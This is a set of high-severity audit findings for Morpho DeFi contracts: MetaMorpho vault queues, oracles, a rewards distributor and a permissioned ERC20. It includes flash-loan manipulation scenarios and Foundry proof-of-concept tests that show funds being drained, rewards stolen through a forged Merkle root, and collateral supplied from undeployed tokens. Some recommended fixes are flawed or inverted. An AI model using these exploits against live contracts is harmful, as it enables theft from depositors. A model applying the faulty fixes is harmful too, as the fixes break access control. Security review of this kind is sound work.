## High risk
### Decommissioned Oracle Feeds can cause denial of service	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [ChainlinkOracle.sol#L116-L121](morpho-blue-oracles/src/ChainlinkOracle.sol#L116-L121)

- Description
This contract uses a constructor for allocating specific price feed to the oracle. Price feeds that are safe and functional today are not guaranteed for stability, security and integrity. A price feed that is functional today may not be in operation at a later date. Morpho related periphery and market contracts depending on this Oracle contract will be broken if feeds are decommissioned, turned hostile or subject to multisig manipulation.


- Recommendation

Provide the capability to change the price feeds. If it isn't expected behaviour that a specific person should be able to change the oracle, this could be done under certain conditions either an oracle health check is performed, an owner or governance contract is allowed to add a new feed to adjust the oracle contract.



### MetaMorpho vaults supply and withdraw queues can be manipulated	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

Each MetaMorpho vault maintains a supply queue and a withdraw queue. Upon a deposit, the vault will supply up to the cap of each Morpho Blue market in the `supplyQueue` in the order set. Upon a withdrawal, the vault will withdraw up to the liquidity of each Morpho Blue market in the `withdrawalQueue` in the order set.

Prior to the audit the code was [updated](https://github.com/morpho-org/metamorpho/commit/3c5a959184bed4514524efee476cad61d0fe35b1) to stop tracking idle liquidity in-contract in favor or having [idle markets to allocate idle funds](https://github.com/morpho-org/metamorpho#idle-supply).

This report outlines several attack scenarios that are enabled by the protocol offering zero fee flash-loans to leverage the liquidity of all Morpho Blue markets and the fact that supply and withdraw operations are performed on the underlying markets  instantly. This combination allows external attackers to move user funds around as they see fit regardless of the allocator  arrangement, therefore gaining an advantage in all scenarios unless infinite cap idle markets are set in front of both the supply and withdraw queues.

- Scenario 1. An attacker can reallocate vault funds to a desired market where he holds a borrower position outside of MetaMorpho to lower his borrowing rate.

Let attacker X be a borrower on Morpho Blue market C. A MetaMorpho vault with supply and withdraw queues for markets A-B-C exists with current deposits (10, 10, 10) and supply cap (20, 20, 20). Keep in mind that these values serve to keep the example simple but do not represent any limitation to the attacker unless there is an infinite cap sink to swallow all provided liquidity.

Attacker X wants to lower the borrow rate he is currently paying on market C. In order to do this, he can easily shuffle liquidity around in the MetaMorpho vault so users subsidize his borrowing activity regardless of the order set by the allocator.

1. Take a free flash-loan of the loan token (make it 30 in this case)
2. Deposit the entire amount into the vault, making current deposits (A, B, C) = (20, 20, 20)
3. Withdraw the entire amount from the vault, making current deposits (A, B, C) = (0, 10, 20)
4. Repay the flash-loan

As a result, the attacker moved the entire vault liquidity supplied to Morpho Blue market A to market C, increasing loan token liquidity on that market and benefiting from lower borrowing costs on this loan.

- Scenario 2. An attacker can withdraw liquidity from a desired market where he holds a lending position outside of MetaMorpho to increase the borrowing rate paid by others.

Attacker X is a lender to Morpho Blue market A. He does not welcome vault provided liquidity that dillutes his presence, so he decides to force MetaMorpho vault users to withdraw their liquidity and place it into other markets to ensure borrowing rates paid on loans stay as high as possible.

Take the same initial configuration as in the previous scenarios to simplify. Supply and withdraw queues are set to (A, B, C) with current deposits (10, 10, 10) and supply caps (20, 20, 20). Attacker X takes a flash-loan for 30 units of the loan asset and again deposits it all and immediately withdraws. Final state is (A, B, C) = (0, 10, 20).

As a result, user liquidity provided to the vault has been withdrawn from the underlying A market and the attacker managed to avoid dilluting his position.

- Scenario 3. An attacker can abuse a supply queue with an infinite cap idle market in front, if the withdrawal queue does not begin with one, to remove liquidity from all markets.

In this scenario the allocator sets an infinite cap idle market as the first element of the supply queue. If the withdrawal queue has other markets before reaching the infinite cap idle market, an attacker could be able to withdraw the entire liquidity provided from those markets. In the worst case scenario where the withdraw queue does not contain an infinite cap idle market, then liquidity could be forced-withdrawn from all underlying Morpho Blue markets.

1. Take a free flash-loan of the loan token's full balance
2. Deposit the entire amount into the vault (all goes to the idle market in the first position)
3. Withdraw the entire amount from the vault
4. Repay the flash-loan

---

It is important to note that even if the allocator attempts a queue reordering, it is possible for any external actor to shuffle funds again immediately after.

These scenarios are bounded by the available flash-loan liquidity, which can be expected to be enough to conduct them as all assets across every Morpho Blue market are flash-loanable.


**Remediation:**

We find that to avoid having an inherently unstable system that can be manipulated by external attackers, it is essential to enforce an infinite cap idle market at the beginning of both supply and withdrawal queues. This would ensure allocators can in fact enforce the ordering without it being reverted immediately after by external actors without specific roles or permissions over the vault.



### MetaMorpho.updateWithdrawQueue() might remove a market that has a  non-zero supply in it. 	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
MetaMorpho.updateWithdrawQueue() might remove a market that has non-zero supply in it.  As a result, a supplier might lose funds when he withdraw his shares. 

It takes two steps to remove a market from the withdrawQueue of the vault: 1) the CURATOR calls submitMarketRemoval() to submit a request to remove the market; 2) after the ``timelock`` expires, then the ALLOCATGOR calls updateWithdrawQueue() to remove the market. 

The problem is that: 1)  updateWithdrawQueue() allows a market to be removed even thought the vault has non-zero supply in it; 2) after the removel of such non-zero supply market, the totalAssets of the vualt will be decreased as can be seen by the following function: 

```javascript
  function totalAssets() public view override returns (uint256 assets) { // add all exepctedSupplyAssets from all withdrawQueues.
        for (uint256 i; i < withdrawQueue.length; ++i) {
            assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
        }
    }
```
When this happens, a user who withdraws his shares from the vault will lose funds. 

In the following POC, we show that:

1) The SUPPLIER supplies 3.3 ether to the vault, market0 will get 1 ether, market1 will get 2 ether and market2 will get 0.3 ether.

2) Borrower1 borrows 1 ether from market0.

3) After one year,  due to interests in market0, vault lastTotalAssets increases to: 3945833333288119332.

4) After market0 is removed, vault's lastTotalAssets decreases to: 2300000000000000000

5) the SUPPLIER withdraw all his shares, he only get 2262354804648455450 loanTokens, losing around 1.14 ether tokens, not only the investment in market0, but also the fee for the interests to the fee recipient. 


I have commented out the line `` _setCap(idleParams, type(uint184).max);" in integrationTest.sol, and uses only allMarkets[0], allMarkets[1] and allMarkets[1] for this experiment- see the following new setup().


```javascript

// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IERC20Errors} from "../../lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol";
import {IMorphoFlashLoanCallback} from "../../lib/morpho-blue/src/interfaces/IMorphoCallbacks.sol";

import "./helpers/IntegrationTest.sol";

contract MyTest is IntegrationTest, IMorphoFlashLoanCallback {
    using MorphoBalancesLib for IMorpho;
    using MorphoLib for IMorpho;
    using MarketParamsLib for MarketParams;

    Id[] marketIds = new Id[](3);

    function setUp() public override virtual {
        super.setUp();                          // the first is an idle market?
        _setFee(0.1e18);

 
        for(uint256 i; i < 3; i++){        // use the first three markets
             _setCap(allMarkets[i], (i+1) * 1e18);
             marketIds[i] = allMarkets[i].id();
        }

        vm.prank(ALLOCATOR);
        vault.setSupplyQueue(marketIds);
        
        // _sortSupplyQueueIdleLast();
        console2.log("vault supply queue length:", vault.supplyQueueLength());
        console2.log("vault withdraw queue length:", vault.withdrawQueueLength());
    }

    function testRemoveMarket() public{

         // 1. SUPPLIER supplies 3.3e18
         uint256 assets = 3.3e18; // 1 for market 0, 2, for market 1, and 0.3 for market 2
        uint256 shares = vault.convertToShares(assets);
        loanToken.setBalance(SUPPLIER, assets);
        vm.expectEmit();
        emit EventsLib.UpdateLastTotalAssets(vault.totalAssets() + assets);
        vm.prank(SUPPLIER);
        uint256 deposited = vault.mint(shares, SUPPLIER);
        console2.log("vault balance of SUPPLIER:", vault.balanceOf(SUPPLIER));
        console2.log("Last total assets: %d", vault.lastTotalAssets());
        console2.log("Vault's assert in market0", morpho.expectedSupplyAssets(allMarkets[0], address(vault)));
        console2.log("Vault's assert in market1", morpho.expectedSupplyAssets(allMarkets[1], address(vault)));
        console2.log("Vault's assert in market2", morpho.expectedSupplyAssets(allMarkets[2], address(vault)));
  

        // 2. borrower1 borrows 1 ether from market0
        console2.log("\n After  borrower1 borrows 1 ether from market0");
        address borrower1 = makeAddr("borrower1");
        collateralToken.setBalance(borrower1, 10 ether);
        vm.startPrank(borrower1);
        collateralToken.approve(address(morpho), 10 ether);
        bytes memory d;
        morpho.supplyCollateral(allMarkets[0], 10 ether, borrower1, d);
        morpho.borrow(allMarkets[0], 1 ether, 0, borrower1, borrower1);
        vm.stopPrank();
        console2.log("total supply shares for market 0:", morpho.totalSupplyShares(marketIds[0]));
        console2.log("total supply assets for market 0:", morpho.totalSupplyAssets(marketIds[0]));
        console2.log("total borrow shares for market 0:", morpho.totalBorrowShares(marketIds[0]));
        console2.log("total borrow assets for market 0:", morpho.totalBorrowAssets(marketIds[0]));
        
        console2.log("borrower1 borrow shares: %d", morpho.borrowShares(marketIds[0], borrower1));
        console2.log("borrower1 loanToken balance: %d", loanToken.balanceOf(borrower1));

        // 3. AFter one year, interests are accrued on market 0
        vm.warp(block.timestamp + 365 days);
        morpho.accrueInterest(allMarkets[0]);

        // 4. Therefore lastTotalAssets should increase
        vm.prank(OWNER);
        vault.setFeeRecipient(makeAddr("NEW_RECIPIENT1")); // just to trigger _accrueFee()
        console2.log("\n After one year, due to interests in market0, vault lastTotalAssets: %d", vault.lastTotalAssets());
  
        // CURATOR and ALLOCATOR remove market0 even though its supplyShares for this contract != 0
        vm.prank(CURATOR);
        vault.submitMarketRemoval(marketIds[0]); // remove market0
        vm.warp(block.timestamp + 365 days + 1 weeks);
        uint256[] memory indexes = new uint256[](2);      
         indexes[0] = 1;
         indexes[1] = 2;
         vm.prank(ALLOCATOR); 
         vault.updateWithdrawQueue(indexes);
       
        console2.log("\n after market0 is removed.");
        vm.prank(OWNER);
        vault.setFeeRecipient(makeAddr("NEW_RECIPIENT2")); // just to trigger _accrueFee();
        console2.log("Decreased vault's lastTotalAssets: %d", vault.lastTotalAssets());

        // finally SUPPLIER redeem all his shares, he is supposed to win but he loses.
        vm.prank(SUPPLIER);
        vault.redeem(shares, SUPPLIER, SUPPLIER);
        console2.log("SUPPLIER withdraws his shares, end up with loanToken balance of SUPPLEIR: ", loanToken.balanceOf(SUPPLIER));

    }
}
```



**Recommendation**:
Only remove a market when it has a non-zero supply in it. 



### Tokens not yet deployed can be deposited in Morpho and be drained once deployed and supplied to Morpho Blue

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

Malicious users can create a market with one loan token or collateral token that has not been deployed yet, and then call `supply` or `supplyCollateral` to increase their balance. Once the token is deployed, the attacker just has to wait for other users to supply the token to **Morpho blue** and then call `withdraw` or `withdrawCollateral` to drain the contract.

This can be done because the `SafeTransferLib` library used by **Morpho blue** does not revert when transferring tokens if the token address does not contain bytecode (i.e: there's no contract deployed at that address).

This situation could happen, for instance:
* For tokens that are deployed to different chains with the same address. It is common practice to deploy tokens (and other contracts) using the same address in different chains. This way, the attacker could supply the token and once the project deploys it and users supply amounts of it, drain the contract.
* Using a bot that tracks the activity of deployer contracts of interesting projects, malicious users could frontrun the deployment of a token to create a market and supply an arbitrary amount of such token. Once done, just waiting for users to supply would be enough to drain it.

**Recommendation**:

My assumption is that `SafeTransferLib` does not check if the token address is a contract address to save gas on transfers. If that is the case, contract existence should anyway be checked in certain functions of **Morpho Blue**. Mainly:
* `supply`
* `supplyCollateral`

If that is not the case, `SafeTransferLib`'s `safeTransfer` and `safeTransferFrom` should be updated to check that `token` is a contract.


**PoC**

The following test (which you can add to the `test/forge/integration` folder of the project and try it) shows how a malicious user could supply `type(uint256).max` collateral of an unexisting token.

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "../BaseTest.sol";

contract NeumoSupplyNonExistingCollateralTest is BaseTest {
    using MathLib for uint256;
    using MorphoLib for IMorpho;
    using MarketParamsLib for MarketParams;

    function testSupplyNonExistingCollateral() public {

        address alice = makeAddr("alice");

        address loanToken1 = address(10);       // no contract deployed @ this address
        address collateralToken1 = address(11); // no contract deployed @ this address
        address oracle1 = address(3);           // not used
        address irm1 = marketParams.irm;        // must be an irm contract enabled by the owner
        uint256 lltv1 = marketParams.lltv;      // must be an lltv value enabled by the owner

        MarketParams memory marketParams1 = MarketParams(
            address(loanToken1), 
            address(collateralToken1), 
            address(oracle1), 
            address(irm1), 
            lltv1
        );

        vm.startPrank(alice);
        // Alice creates the market
        morpho.createMarket(marketParams1);
        // Alice supplies a max uint128 value of collateral
        morpho.supplyCollateral(marketParams1, type(uint128).max, address(alice), new bytes(0));
        vm.stopPrank();

        Position memory p = morpho.position(marketParams1.id(), alice);
        // We assert that the amount of collateral that Alice has in her position is type(uint128).max
        assertEq(p.collateral, type(uint128).max);

    }
}
```



### `_update` will not allow anyone to hold any tokens	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [ERC20PermissionedBase.sol#L66-L66](erc20-permissioned/src/ERC20PermissionedBase.sol#L66-L66)

- Summary 
This custom made wrapper uses [hasPermission](https://github.com/morpho-org/erc20-permissioned/blob/main/src/ERC20PermissionedBase.sol#L52-L54) to check if the given address has permissions or not. However when combined with the overridden [_update](https://github.com/morpho-org/erc20-permissioned/blob/main/src/ERC20PermissionedBase.sol#L66-L71) enables **only** Morpho and Bundler to hold or transfer these wrapped tokens.

- Proof of concept
Bellow we can see that [_update](https://github.com/morpho-org/erc20-permissioned/blob/main/src/ERC20PermissionedBase.sol#L66-L71) reverts on everything that doesn't have a permission.  
```solidity
    function hasPermission(address account) public view virtual returns (bool) {
        return account == address(0) || account == MORPHO || account == BUNDLER;
    }

    function _update(address from, address to, uint256 value) internal virtual override {
        if (!hasPermission(from)) revert NoPermission(from);
        if (!hasPermission(to)) revert NoPermission(to);

        super._update(from, to, value);
    }
```
However [_update](https://github.com/morpho-org/erc20-permissioned/blob/main/src/ERC20PermissionedBase.sol#L66-L71) is responsible for [transferring](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L171-L179), [minting](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L230) and [burning](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L245) tokens. This makes every other address not possible to hold any of these tokens.

The issue arises from the fact that this wrapper is meant to be used with the [ERC20WrapperBundler](https://github.com/morpho-org/morpho-blue-bundlers/blob/main/src/ERC20WrapperBundler.sol). And our bundler invokes `ERC20Wrapper(wrapper).depositFor(initiator(), amount)`  on [erc20WrapperDepositFor](https://github.com/morpho-org/morpho-blue-bundlers/blob/main/src/ERC20WrapperBundler.sol#L30-L39). `initiator()` is the `msg.sender`  when used in a bundle with multicall. [depositFor](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Wrapper.sol#L61) in the wrapper does mint which unfortunately will revert once update tries to add tokens to `msg.sender` (address without permission).

```solidity
    function depositFor(address account, uint256 value) public virtual returns (bool) {
        address sender = _msgSender();
        if (sender == address(this)) {
            revert ERC20InvalidSender(address(this));
        }
        if (account == address(this)) {
            revert ERC20InvalidReceiver(account);
        }
        SafeERC20.safeTransferFrom(_underlying, sender, address(this), value);
        _mint(account, value); // _mint will invoke _update which will revert
        return true;
    }
```

- Severity
This makes the whole [ERC20WrapperBundler](https://github.com/morpho-org/morpho-blue-bundlers/blob/main/src/ERC20WrapperBundler.sol) and [ERC20PermissionedBase](https://github.com/morpho-org/erc20-permissioned/blob/main/src/ERC20PermissionedBase.sol) useless.

- Recommended solution
I can suggest to change the permissions.

```diff
    function _update(address from, address to, uint256 value) internal virtual override {
-       if (!hasPermission(from)) revert NoPermission(from);
-       if (!hasPermission(to)) revert NoPermission(to);

+       if (hasPermission(from)) revert NoPermission(from);
+       if (hasPermission(to)) revert NoPermission(to);

        super._update(from, to, value);
    }
```



### Temporary Fund freeze	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L824-L824](metamorpho/src/MetaMorpho.sol#L824-L824)

The withdrawal are processed from markets in withdrawalQueue sequentially. So if a market is present at end of withdrawalQueue then it has least chance of being withdrawn, especially if high supply market is in early index of withdrawalQueue.
This becomes an issue if the market at end of withdrawalQueue index is marked for removal by Curator since `config[id].removableAt` time period might cross before protocol has chance to withdraw from this market

Steps:
1. Lets say 26 markets are present in withdrawQueue as A,B,C,...Z
2. Market Z is marked for removal with config[id].removableAt as T1
3. All user withdraws are fulfilled by starting 10 markets which means nothing is withdrawn from market Z
4. Timestamp T1 is reached and market Z gets removed from WithdrawQueue
5. Now there is no way to access funds from market Z (temporary freeze)

Recommendation:
If a market is marked for removal then it should be first one to be made available for withdraw or removing the market should withdraw all assets and placed in another market (cannot place in contract as attacker can call skim)



### UniversalRewardsDi.stributor.setOwner() fails to use a two-step procedure to change the ownership.	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
UniversalRewardsDi.stributor.setOwner() fails to use a two-step procedure to change the ownership. In case the ``newOwner`` is an invalid/inaccessible address, the ownership will be totally lost. 

```javascript
function setOwner(address newOwner) external onlyOwner {
        require(newOwner != owner, ErrorsLib.ALREADY_SET);

        _setOwner(newOwner);
    }
```

**Recommendation**:

User Openzeppelin's Ownerable2Step to transfer ownership safely: 

[https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)




### An dishonest UPDATOR might submit an illegal root immediately and then steal funds from UniversalRewardsDistributor(). 	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
A dishonest updater might submit an illegal root immediately and then steal funds from UniversalRewardsDistributor() when timelock = 0.

First of all, the owner of UniversalRewardsDistributor has overly centralized control: 1) he can change timelock instantly; 2) change the Updator role instantly; and 3) change the root instantly. 
Thus, the owner is supposed to be fully trustworthy. In case it is compromised or dishonest, then the protocol is endanger. This is the first concern for this protocol

But a more serious concern is that: whenever timelock = 0,  an updater  can immediately change the root; see below:

```javascript
function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {  // only the owner can by pass unless timeLock = 0;
        require(newRoot != root || newIpfsHash != ipfsHash, ErrorsLib.ALREADY_SET);
        require(timelock == 0 || msg.sender == owner, ErrorsLib.UNAUTHORIZED_ROOT_CHANGE);

        _setRoot(newRoot, newIpfsHash);
    }
```

After the illegal root is set, the dishonest updater can withdraw rewards illegally.

The following POC confirms my finding. The updater can steal from funds from both  distributionWithoutTimeLock (timelock =0) and distributionWithTimeLock, when its timelock is changed to zero by the owner. In summary, when timelock = 0, a dishonest updator can steal funds from the rewards distributor. 

```javascript
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {PendingRoot, IUniversalRewardsDistributor} from "../src/interfaces/IUniversalRewardsDistributor.sol";

import {ErrorsLib} from "../src/libraries/ErrorsLib.sol";

import {MockERC20} from "../lib/solmate/src/test/utils/mocks/MockERC20.sol";
import {UniversalRewardsDistributor} from "../src/UniversalRewardsDistributor.sol";
import {EventsLib} from "../src/libraries/EventsLib.sol";

import {Merkle} from "../lib/murky/src/Merkle.sol";
import "../lib/forge-std/src/Test.sol";
import {MerkleProof} from "../lib/openzeppelin-contracts/contracts/utils/cryptography/MerkleProof.sol";

contract UniversalRewardsDistributorTest is Test {
    uint256 internal constant MAX_RECEIVERS = 20;
    bytes32 internal constant SALT = bytes32(0);

    Merkle merkle = new Merkle();
    MockERC20 internal token1;
    MockERC20 internal token2;
    IUniversalRewardsDistributor internal distributionWithoutTimeLock;
    IUniversalRewardsDistributor internal distributionWithTimeLock;
    address owner = makeAddr("Owner");
    address updater = makeAddr("Updater");

    bytes32 DEFAULT_ROOT = bytes32(keccak256(bytes("DEFAULT_ROOT")));
    bytes32 DEFAULT_IPFS_HASH = bytes32(keccak256(bytes("DEFAULT_IPFS_HASH")));
    uint256 DEFAULT_TIMELOCK = 1 days;

    function setUp() public {
        distributionWithoutTimeLock = IUniversalRewardsDistributor(
            address(
                new UniversalRewardsDistributor(
                owner, 0, bytes32(0), bytes32(0)
                )
            )
        );
        token1 = new MockERC20("Token1", "TKN1", 18);
        token2 = new MockERC20("Token2", "TKN2", 18);

        vm.startPrank(owner);
        distributionWithoutTimeLock.setRootUpdater(updater, true);

        vm.warp(block.timestamp + 1);
        distributionWithTimeLock = IUniversalRewardsDistributor(
            address(
                new UniversalRewardsDistributor(
                owner, DEFAULT_TIMELOCK, bytes32(0), bytes32(0)
                )
            )
        );
        distributionWithTimeLock.setRootUpdater(updater, true);
        vm.stopPrank();

        token1.mint(owner, 1000 ether * 200);
        token2.mint(owner, 1000 ether * 200);

        token1.mint(address(distributionWithoutTimeLock), 1000 ether * 200);
        token2.mint(address(distributionWithoutTimeLock), 1000 ether * 200);
        token1.mint(address(distributionWithTimeLock), 1000 ether * 200);
        token2.mint(address(distributionWithTimeLock), 1000 ether * 200);
    }

    function testDishonestUpdator() public{
        bytes32[] memory proof = new bytes32[](3); // create a random p roof
        proof[0] = keccak256(abi.encode("proof1"));
        proof[1] = keccak256(abi.encode("proof2"));
        proof[2] = keccak256(abi.encode("proof3"));
        bytes32 leaf =  keccak256(bytes.concat(keccak256(abi.encode(updater, address(token1), 1000 ether)))); // steal 1000 ether
        bytes32 expectedRoot = MerkleProof.processProof(proof, leaf);
        
        // the updater changes the root and steal from distributionWithoutTimeLoc
        vm.startPrank(updater);
        distributionWithoutTimeLock.setRoot(expectedRoot, keccak256(abi.encode("newIpfsHash")));
        distributionWithoutTimeLock.claim(updater, address(token1), 1000 ether, proof);
        vm.stopPrank();
        assertEq(token1.balanceOf(updater), 1000 ether);

        // steal from distributionWithoutTimeLock
        vm.prank(owner);
        distributionWithTimeLock.setTimelock(0);


         // the updater changes the root and steal from  distributionWithTimeLock
        vm.startPrank(updater);
        distributionWithTimeLock.setRoot(expectedRoot, keccak256(abi.encode("newIpfsHash")));
        distributionWithTimeLock.claim(updater, address(token1), 1000 ether, proof);
        vm.stopPrank();
        assertEq(token1.balanceOf(updater), 2000 ether);

        console2.log("token1 balance of updater: ", token1.balanceOf(updater));
    }
}
```

**Recommendation**:
Never allow the updater to change the root when timelock is zero, otherwise there is no time to examine whether the given root is legal or not. 



### Relying on the Chainlink feeds keeping its promises can result in massive loss of funds for user 	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [ChainlinkDataFeedLib.sol#L18-L18](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L18-L18)

**Description**: 

In the comment in `ChainlinkDataFeedLib.sol.getPrice()` it is mentioned that `"the price is not checked to be in the min/max bounds because it's assumed that the Chainlink feed keeps its promises on this".` The promises of chainlink regarding the mechanism of the min/max price, is that the price feed will return the minPrice and not the real, lower price, if the price of the asset falls to fast. 

Any protocol (e.g MorphoBlue) that uses this price for further calculation will value the token to high and allow users to add more of this “worthless” tokens as collateral to borrow “valuable” tokens.

Example: TokenA is used as the collateral token in a market and its price fee has a minPrice of USD 1 USD. The price of TokenA drops to USD 0.10. The price feed will still return USD 1 allowing the user to borrow against TokenA as if it is USD 1 which is 10x it's actual value.



**Recommendation**: Consider adding a check for the min/max price when getting the price from chainlink and revert in case the price is the min/max price to prevent overvaluation of tokens used as collateral and therefore the overborrowing against this tokens.




### Owner can add many markets to WithdrawQueue, resulting in users being unable to withdraw assets due to GAS exhaustion	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
In the protocol, any user can create a MetaMorpho in the MetaMorphoFactory and that user will be the owner to manage that MetaMorpho.
```solidity
    function createMetaMorpho(
        address initialOwner,
        uint256 initialTimelock,
        address asset,
        string memory name,
        string memory symbol,
        bytes32 salt
    ) external returns (MetaMorpho metaMorpho) {
        metaMorpho = new MetaMorpho{salt: salt}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);

        isMetaMorpho[address(metaMorpho)] = true;

        emit EventsLib.CreateMetaMorpho(
            address(metaMorpho), msg.sender, initialOwner, initialTimelock, asset, name, symbol, salt
        );
    }
```
In MetaMorpho, the protocol restricts the privileges of the owner, such as setting timelocks on any operation that might compromise users of this MetaMorpho.

But in updateWithdrawQueue(), the owner can add many markets to WithdrawQueue, and these markets can even be duplicates.
```solidity
    function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole {
        uint256 newLength = indexes.length;
        uint256 currLength = withdrawQueue.length;

        bool[] memory seen = new bool[](currLength);
        Id[] memory newWithdrawQueue = new Id[](newLength);

        for (uint256 i; i < newLength; ++i) {
            uint256 prevIndex = indexes[i];

            // If prevIndex >= currLength, it will revert with native "Index out of bounds".
            Id id = withdrawQueue[prevIndex];
            if (seen[prevIndex]) revert ErrorsLib.DuplicateMarket(id);
            seen[prevIndex] = true;

            newWithdrawQueue[i] = id;
        }

        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

                delete config[id];
            }
        }

        withdrawQueue = newWithdrawQueue;

        emit EventsLib.SetWithdrawQueue(_msgSender(), newWithdrawQueue);
    }
```
totalAssets() and _withdrawMorpho() iterate through all the markets in WithdrawQueue, so when there are too many markets in WithdrawQueue, totalAssets() and _withdrawMorpho() will fail due to exceeding the block gas limit.
```solidity
    function totalAssets() public view override returns (uint256 assets) {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
        }
    }
...
    function _withdrawMorpho(uint256 assets) internal {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            Id id = withdrawQueue[i];
            MarketParams memory marketParams = _marketParams(id);
            (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);

            uint256 toWithdraw = UtilsLib.min(
                _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
            );

            if (toWithdraw > 0) {
                // Using try/catch to skip markets that revert.
                try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {
                    assets -= toWithdraw;
                } catch {}
            }
```
Consider the following scenario,

MetaMorpho A's WithdrawQueue has markets [a,b], the owner adds 1000 duplicate markets c to WithdrawQueue, then the WithdrawQueue has markets [c,c, ... ,c,a,b], so when users withdraw assets, it will fail due to GAS exhaustion.

**Recommendation**:
Consider limiting the length of the WithdrawQueue to avoid the owner adding too many markets to compromise users.



### Suppliers can frontrun forced market removal and losses

**Severity:** High risk

**Context:** [MetaMorpho.sol#L378-L378](metamorpho/src/MetaMorpho.sol#L378-L378), [MetaMorpho.sol#L613-L613](metamorpho/src/MetaMorpho.sol#L613-L613)

**Description**: Markets can be forcefully removed in `updateWithdrawQueue` even if assets are still supplied to it. This will lead to a drop in total assets and losses are socialized among all current suppliers.
Any supplier can escape this loss by redeeming their shares before the removal. This is especially easy to do as the market removal has to be signalled in advance and can only happen after the `config[id].removableAt` timestamp. Many suppliers might try to remove their assets before that timestamp which can lead to a liquidity crunch and operational issues with the contract.

**Recommendation**: Require the supplied assets to be zero which forces the allocator to bundle a reallocation that withdraws everything from this market first.



### Suppliers can profit from re-enabling a force-removed market

**Severity:** High risk

**Context:** [MetaMorpho.sol#L378-L378](metamorpho/src/MetaMorpho.sol#L378-L378), [MetaMorpho.sol#L613-L613](metamorpho/src/MetaMorpho.sol#L613-L613)

**Description**: Markets can be forcefully removed in `updateWithdrawQueue` even if assets are still supplied to it. This will lead to a drop in total assets and losses are socialized among all current suppliers.
If the market is enabled again by setting a non-zero supply cap via `setCap(cap > 0)` the `totalAssets` will experience a sudden jump. Any user can steal most of this increase by sandwiching the `setCap` with a huge deposit before and a redemption afterwards. The other users (who might have lost the assets of the market at the time of market removal) will permanently experience this loss.

**Recommendation**: Require the supplied assets to be zero when removing a market which means the `totalAssets` can never decrease because of market removals in the first place.



### First depositor can steal funds of others	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- **Severity**

HIGH

- **Relevant GitHub Links**

- https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L559

- **Summary**

The `MetaMorpho.sol` contract incorporates an `ERC4626` vault for depositing and withdrawing funds. However, a vulnerability exists in the default `ERC4626` implementation, allowing an attacker to front-run the first depositor. This could result in the attacker profiting at the expense of the initial depositor.

- **Vulnerability Details**

The vulnerability arises when the first depositor (e.g., Alice) triggers a deposit transaction. An attacker (e.g., Bob) can front-run this transaction by depositing a minimal amount, manipulating the total assets and total supply calculations. Subsequently, when the legitimate deposit transaction is executed, the calculated shares for the initial depositor are compromised, leading to potential financial losses.

- **Impact**

The impact of this vulnerability is significant, as it exposes users to potential financial losses. In the described scenario, the first depositor may lose funds, and the attacker profits from the manipulated state of the vault.

- **POC**

1 - Alice initiates a deposit of `2 million USDC` to a pool.

2 - Bob observes Alice's transaction and strategically front-runs by depositing `1 wei` USDC, creating 1 wei share. Simultaneously, Bob transfers 1 million USDC to the pool.

3 - Alice's deposit transaction is executed. At this point, the total assets in the pool become 1 million USDC + 1, and the total supply of shares is 1. Alice is allocated 1 share based on the formula: `2M * 1e6 * 1 / (1M * 1e6 + 1) = 1 share`

 4 - Following Alice's deposit, the pool now holds a total of 3 million USDC + 1 in assets and has distributed 2 shares. This leads to a scenario where Bob profits by `0.5` million USDC, while Alice incurs a loss of 0.5 million USDC

In summary, Bob's front-running tactic manipulates the pool state, resulting in a distribution that favors the attacker at the expense of the initial depositor, Alice.

- **Tools used**

- Manual review

- **Recommendations**

